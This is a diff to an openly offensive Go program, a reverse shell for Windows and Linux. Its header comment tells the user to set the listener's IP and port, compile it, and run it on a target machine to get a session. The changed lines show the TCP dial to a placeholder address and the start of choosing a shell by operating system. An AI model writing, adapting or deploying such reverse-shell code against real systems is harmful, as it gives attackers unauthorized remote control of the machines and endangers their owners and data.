@@ -1,7 +1,7 @@
 /*
 This is a Go program which will create a reverse shell by connecting to a specified address and port. It can be used to create both Windows and Linux reverse shells.
 
-Usage: Edit line 16 in shell.go to use the IP address and port of your listener. Compile and then execute the program from the target machine to have it establish a session with you.
+Usage: Edit line 23 in shell.go to use the IP address and port of your listener. Compile and then execute the program from the target machine to have it establish a session with you.
 
 Compiling for Windows: GOOS=windows go build shell.go
 
@@ -20,7 +20,7 @@ import (
 
 func main() {
 	// Create a new connection to the specified address.
-	if client, err := net.Dial("tcp", "localhost:6969"); err == nil {
+	if client, err := net.Dial("tcp" /*IP:Port*/, "localhost:6969"); err == nil {
 		var cmd *exec.Cmd
 		// Switch which shell to use depending on the OS.
 		switch runtime.GOOS {
